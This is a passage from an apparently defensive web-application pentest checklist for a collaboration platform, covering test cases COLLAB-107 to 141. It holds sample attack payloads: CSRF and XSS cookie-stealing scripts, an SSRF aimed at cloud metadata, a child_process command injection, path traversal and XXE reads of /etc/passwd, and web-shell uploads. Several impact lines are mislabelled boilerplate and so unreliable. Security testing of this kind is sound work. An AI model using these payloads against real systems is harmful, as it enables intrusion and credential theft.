**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Guest Access

**Test Steps:** 1. Login as a guest. 2. Attempt to download or export shared resources. 3. Check if copy-paste restrictions are enforced. 4. Test for bulk download capabilities. 5. Check for print restrictions.

**Expected Result:** Application must enforce download and export restrictions for guest users based on the sharing settings and prevent unauthorized data exfiltration.

**Payload Example:**

```
GET /api/documents/DOC-1001/download with guest token when download is restricted;attempt bulk export
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-107 — Guest Access CSRF on Shared Resource
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Guest Access

**Test Steps:** 1. Craft a malicious page that modifies a shared resource using guest's authenticated session. 2. Lure guest to visit. 3. Check if modification occurs without CSRF token.

**Expected Result:** Application must validate CSRF tokens even for guest sessions on all state-changing operations.

**Payload Example:**

```
<script>fetch('/api/documents/DOC-1001',{method:'PUT',credentials:'include',body:'{"content":"modified by CSRF"}'})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COLLAB-108 — Guest Access to Activity Feed
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Guest Access

**Test Steps:** 1. Login as a guest. 2. Attempt to access the workspace activity feed. 3. Check if guest can see activities beyond their shared resources. 4. Test for information leakage about internal workspace activities.

**Expected Result:** Application must restrict guest access to activity feed entries only related to resources explicitly shared with the guest.

**Payload Example:**

```
GET /api/workspaces/WS-1001/activity-feed with guest token;check for activities on non-shared resources
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-109 — Guest Account Brute Force
**Test Category:** Authentication (WSTG-ATHN-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Guest Access

**Test Steps:** 1. Identify the guest access authentication mechanism. 2. If password-protected test for brute force. 3. Check rate limiting on guest access attempts. 4. Test for lockout mechanisms.

**Expected Result:** Application must implement rate limiting on guest access authentication attempts and lock out after excessive failures.

**Payload Example:**

```
Attempt 100+ guest access passwords via brute force;check for lockout;test rate limiting bypass
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder;Hydra

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COLLAB-110 — Workspace API Key Management IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. If workspaces have API keys manage own workspace keys. 2. Change workspace_id to manage another workspace's API keys. 3. Check for cross-workspace key exposure.

**Expected Result:** Application must verify workspace ownership before allowing API key management operations.

**Payload Example:**

```
GET /api/workspaces/WS-2001/api-keys;POST /api/workspaces/WS-2001/api-keys/regenerate with non-owner credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-111 — Workspace Audit Log Access Control
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. Access workspace audit logs. 2. Check if regular members can access admin audit logs. 3. Verify role-based log access. 4. Check for cross-workspace log access.

**Expected Result:** Application must restrict audit log access to workspace admins and owners only.

**Payload Example:**

```
GET /api/workspaces/WS-1001/audit-logs with member credentials;GET /api/workspaces/WS-2001/audit-logs
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-112 — Document Link Sharing Authentication Bypass
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. Create a shared document link with password protection. 2. Access the link without providing the password. 3. Remove or modify the authentication parameter. 4. Check if direct API access bypasses link authentication.

**Expected Result:** Application must enforce authentication on shared document links and not allow bypass through direct API calls or parameter manipulation.

**Payload Example:**

```
Access /api/documents/DOC-1001/shared/LINK-TOKEN without password;remove password parameter;access underlying API directly
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COLLAB-113 — Document Collaboration Webhook SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. If document events trigger webhooks configure webhook with internal URLs. 2. Perform document operations to trigger the webhook. 3. Check if internal services are accessed.

**Expected Result:** Application must validate webhook URLs in document collaboration settings and block access to internal network addresses.

**Payload Example:**

```
webhook_url=http://169.254.169.254/latest/meta-data/;callback=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## COLLAB-114 — Collaboration Session Fixation
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Collaboration

**Test Steps:** 1. Obtain a collaboration session token. 2. Share the token with another user. 3. Check if both users share the same session. 4. Test for session hijacking via token sharing.

**Expected Result:** Application must bind collaboration sessions to authenticated users and prevent session sharing or fixation attacks.

**Payload Example:**

```
Share collaboration session_token between two clients;check if both receive same user's data;test token reuse
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## COLLAB-115 — Operational Transformation Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Real-time Collaboration

**Test Steps:** 1. Intercept operational transformation messages during collaboration. 2. Modify operation types or positions. 3. Send out-of-order operations. 4. Inject operations with invalid sequences.

**Expected Result:** Application must validate all operational transformation messages and handle out-of-order or malformed operations gracefully without data corruption.

**Payload Example:**

```
Send OT operations with invalid sequence numbers;modify insert to delete;change position to negative;inject duplicate ops
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-116 — Comment Thread Hijacking
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Comments / Annotations

**Test Steps:** 1. Reply to a comment thread. 2. Intercept and modify the parent_comment_id to inject replies into unrelated threads. 3. Check if reply context is validated. 4. Test for cross-document comment injection.

**Expected Result:** Application must validate comment thread relationships and prevent comment injection into unauthorized threads or documents.

**Payload Example:**

```
POST /api/comments with parent_id=CMT-UNRELATED-2001;inject reply into different document's comment thread
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-117 — Task Status Workflow Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Task Assignment

**Test Steps:** 1. Check defined task workflow (e.g. To Do -&gt; In Progress -&gt; Review -&gt; Done). 2. Attempt to skip workflow steps. 3. Move task directly from To Do to Done. 4. Bypass required review stage.

**Expected Result:** Application must enforce task workflow transitions and prevent skipping required stages.

**Payload Example:**

```
PUT /api/tasks/TASK-1001/status from todo directly to done skipping in_progress and review stages
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-118 — Task Priority Escalation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Task Assignment

**Test Steps:** 1. Create a task with normal priority. 2. Intercept and change priority to critical or blocker. 3. Check if unauthorized priority escalation triggers special workflows or notifications.

**Expected Result:** Application must restrict priority changes to authorized roles and validate priority values against allowed options.

**Payload Example:**

```
Change priority=normal to priority=critical or priority=blocker in task update;add is_emergency=true
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-119 — Project Budget Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Project Management

**Test Steps:** 1. Access project financial data. 2. Intercept and modify budget amounts. 3. Change currency or cost estimates. 4. Check if financial data changes require authorization.

**Expected Result:** Application must restrict project financial modifications to authorized project managers and finance roles with audit logging.

**Payload Example:**

```
Modify project_budget=100000 to project_budget=0;change hourly_rate values;modify cost_estimates
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-120 — Kanban Board Automation Rule Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Kanban Board

**Test Steps:** 1. If Kanban boards support automation rules create rules with injection payloads. 2. Include command injection in rule conditions. 3. Test SSTI in rule templates.

**Expected Result:** Application must sanitize and validate all automation rule definitions and execute rules in sandboxed environments.

**Payload Example:**

```
rule_condition=status=='done' && require('child_process').exec('id');rule_template={{7*7}}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-121 — Time Tracking Report Export Path Traversal
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Time Tracking

**Test Steps:** 1. Export time tracking reports. 2. Modify the export file path parameter. 3. Attempt directory traversal to read arbitrary files.

**Expected Result:** Application must validate export file paths and restrict to authorized export directories.

**Payload Example:**

```
GET /api/time-reports/export?file=../../../etc/passwd;filename=....//....//app/config/database.yml
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## COLLAB-122 — Billable Hours Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time Tracking

**Test Steps:** 1. Log time entries. 2. Modify billable flag and rate after manager approval. 3. Change approved entries via API. 4. Check if approved time entries can be altered.

**Expected Result:** Application must lock time entries after approval and prevent modifications to approved entries without re-approval workflow.

**Payload Example:**

```
Modify approved time entry: change billable=false to billable=true;change rate=50 to rate=500 after approval
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-123 — Activity Feed Real-time WebSocket XSS
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Activity Feed

**Test Steps:** 1. Perform actions that generate real-time activity feed updates via WebSocket. 2. Include XSS payload in action data. 3. Check if the payload executes when the activity is pushed to other users in real-time.

**Expected Result:** Application must sanitize all activity data before broadcasting via WebSocket and before DOM insertion on receiving clients.

**Payload Example:**

```
Rename document to <script>alert(1)</script> triggering activity: "User renamed document to [XSS]" pushed via WebSocket
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;wscat;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-124 — Version Tag Injection
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Version Control

**Test Steps:** 1. Create a version with custom tags or labels. 2. Include XSS payload in tag names. 3. View the version history or tag listing. 4. Check for script execution in tag rendering.

**Expected Result:** Application must sanitize version tags and labels before rendering.

**Payload Example:**

```
version_tag=<script>alert(1)</script>;label=<img src=x onerror=alert(document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-125 — Unauthorized Branch/Fork Creation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Version Control

**Test Steps:** 1. If document versioning supports branching or forking attempt to create branches without authorization. 2. Fork private documents. 3. Check if branch creation is restricted.

**Expected Result:** Application must restrict branching and forking to users with appropriate permissions on the source document.

**Payload Example:**

```
POST /api/documents/DOC-1001/fork with viewer credentials;POST /api/documents/DOC-2001/branch with non-member credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-126 — Conflict Detection Timing Attack
**Test Category:** Information Disclosure (WSTG-INFO-01) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Conflict Resolution

**Test Steps:** 1. Submit document saves with varying content. 2. Measure response times for conflict vs non-conflict saves. 3. Check if timing differences reveal information about other users' editing patterns.

**Expected Result:** Application must ensure consistent response times for document saves regardless of conflict status to prevent timing-based information leakage.

**Payload Example:**

```
Compare response times for saves that trigger conflicts vs clean saves across 100+ requests
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-127 — Permission Inheritance Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Permission Sharing

**Test Steps:** 1. Check if permissions are inherited from parent resources. 2. Access a child resource where parent permission should be denied. 3. Test if child resource permissions override parent restrictions. 4. Check for permission leakage through inheritance.

**Expected Result:** Application must enforce consistent permission inheritance and prevent bypass through direct child resource access.

**Payload Example:**

```
Access /api/projects/PROJ-RESTRICTED/documents/DOC-001 directly when project access is denied;test permission override
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-128 — Sharing Link Brute Force
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Permission Sharing

**Test Steps:** 1. Generate a sharing link and analyze the token format. 2. Check token length and entropy. 3. Attempt to brute force sharing tokens. 4. Test for rate limiting on sharing link access.

**Expected Result:** Application must generate sharing link tokens with at least 128 bits of entropy and implement rate limiting on sharing link access attempts.

**Payload Example:**

```
Brute force /api/shared/TOKEN with 8-character token patterns;test for rate limiting;analyze token entropy
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COLLAB-129 — Guest Session Token Security
**Test Category:** Session Management (WSTG-SESS-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Guest Access

**Test Steps:** 1. Analyze guest session token generation. 2. Check entropy and predictability. 3. Verify secure cookie flags on guest session cookies. 4. Test for session fixation. 5. Check session timeout.

**Expected Result:** Guest session tokens must have adequate entropy with Secure and HttpOnly and SameSite flags and appropriate timeout.

**Payload Example:**

```
Analyze guest session token with Burp Sequencer;check cookie flags;test session reuse after timeout
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Sequencer;Browser DevTools

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COLLAB-130 — Guest Access Resource Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Guest Access

**Test Steps:** 1. As a guest enumerate workspace resources. 2. Try accessing resource listing endpoints. 3. Check if resource IDs or names are disclosed. 4. Test for directory listing of shared resources.

**Expected Result:** Application must prevent guest users from enumerating workspace resources beyond their explicitly shared items.

**Payload Example:**

```
GET /api/workspaces/WS-1001/documents with guest token;enumerate /api/documents/DOC-{ID} as guest
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder;Postman

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## COLLAB-131 — Workspace Transfer Ownership IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team Workspace

**Test Steps:** 1. Transfer workspace ownership. 2. Intercept and change the new_owner_id to an unauthorized user. 3. Check if workspace ownership can be transferred to external users. 4. Test for non-member transfer.

**Expected Result:** Application must validate workspace ownership transfer and restrict to existing workspace members with proper re-authentication.

**Payload Example:**

```
POST /api/workspaces/WS-1001/transfer-ownership with new_owner_id=external_user;change to non-member user_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-132 — Document Template XXE Injection
**Test Category:** Injection (WSTG-INPV-07) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. If document templates accept XML upload create template with XXE payload. 2. Import the malicious template. 3. Check if external entities are resolved during template processing.

**Expected Result:** Application must disable external entity processing in all XML parsers used for document template handling.

**Payload Example:**

```
Upload template: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><template>&xxe;</template>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite;OWASP ZAP

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## COLLAB-133 — Comment File Attachment Malware
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Comments / Annotations

**Test Steps:** 1. If comments allow file attachments upload malicious files. 2. Upload web shells disguised as images or documents. 3. Check content validation and antivirus scanning. 4. Test for file type bypass.

**Expected Result:** Application must validate comment attachment content types and scan for malware before allowing uploads.

**Payload Example:**

```
Upload shell.php.png;malware.docm;polyglot file with embedded code as comment attachment
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;ClamAV;Custom Files

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## COLLAB-134 — @Mention Link Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** @Mentions

**Test Steps:** 1. If @mentions create clickable links check for URL manipulation. 2. Test if mention links can be modified to redirect to external sites. 3. Check for javascript: URI in mention links.

**Expected Result:** Application must generate @mention links server-side pointing only to valid user profiles and not accept client-provided URLs.

**Payload Example:**

```
Modify mention link target from /users/1001 to javascript:alert(1) or https://evil.com in the rendered mention
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-135 — Task Dependency Circular Reference
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Task Assignment

**Test Steps:** 1. Create task dependencies. 2. Attempt to create circular dependencies (A depends on B depends on C depends on A). 3. Check for infinite loops or crashes. 4. Test with self-referencing dependencies.

**Expected Result:** Application must detect and prevent circular dependencies in task relationships and reject self-referencing dependencies.

**Payload Example:**

```
Create dependency chain: TASK-A -> TASK-B -> TASK-C -> TASK-A;create TASK-A depending on itself
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-136 — Project Archive Access Control
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Project Management

**Test Steps:** 1. Archive a project. 2. Check if archived projects are still accessible to all previous members. 3. Test if archived project data can be modified. 4. Check for data retention compliance.

**Expected Result:** Application must enforce read-only access on archived projects and restrict access to authorized users.

**Payload Example:**

```
PUT /api/projects/PROJ-ARCHIVED/settings (attempt modification);GET /api/projects/PROJ-ARCHIVED with expired member credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-137 — Kanban Board Swimlane Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Kanban Board

**Test Steps:** 1. If boards support swimlanes attempt to move cards between swimlanes without authorization. 2. Modify swimlane assignments. 3. Delete swimlanes with cards. 4. Check for data consistency.

**Expected Result:** Application must enforce authorization on swimlane operations and prevent unauthorized card movement between swimlanes.

**Payload Example:**

```
PUT /api/boards/BOARD-1001/cards/CARD-1001/swimlane with unauthorized swimlane_id;delete swimlane with active cards
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-138 — Timer Manipulation via Client-Side
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time Tracking

**Test Steps:** 1. Start a time tracking timer. 2. Intercept the stop timer request. 3. Modify the elapsed time to a higher value. 4. Check if client-provided duration overrides server-tracked time.

**Expected Result:** Application must track time server-side and not accept client-provided duration values that differ from server-calculated time.

**Payload Example:**

```
Modify elapsed_time=300 to elapsed_time=28800 (8 hours) when actual time was 5 minutes;change start_time to earlier timestamp
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-139 — Activity Feed Webhook Data Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Activity Feed

**Test Steps:** 1. If activity feed events trigger webhooks check webhook payloads. 2. Verify data minimization in webhook content. 3. Check if sensitive workspace data is included.

**Expected Result:** Activity feed webhooks must contain only necessary event data and not expose sensitive workspace information in webhook payloads.

**Payload Example:**

```
Configure activity webhook and monitor payload for internal_data;member_emails;project_financials;confidential_details
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Collaborator

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-140 — Version Comparison Cross-Document Attack
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Version Control

**Test Steps:** 1. Use the version comparison feature. 2. Modify the comparison endpoint to compare versions across different documents. 3. Check if cross-document comparison reveals unauthorized content.

**Expected Result:** Application must verify access permissions for both documents when performing cross-document version comparisons.

**Payload Example:**

```
GET /api/versions/compare?doc_a=DOC-1001&version_a=1&doc_b=DOC-2001&version_b=1 with access only to DOC-1001
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-141 — Public Link Indexing Prevention
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Permission Sharing

**Test Steps:** 1. Create public sharing links. 2. Check if the page sets noindex meta tag or X-Robots-Tag header. 3. Search Google for shared link URLs. 4. Verify search engine visibility controls.

**Expected Result:** Public sharing pages must include appropriate noindex directives and X-Robots-Tag headers to prevent search engine indexing.

**Payload Example:**

```
Check shared link pages for <meta name="robots" content="noindex">;check for X-Robots-Tag: noindex header;Google dork site:target.com/shared/
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;Google Dorking;Burp Suite

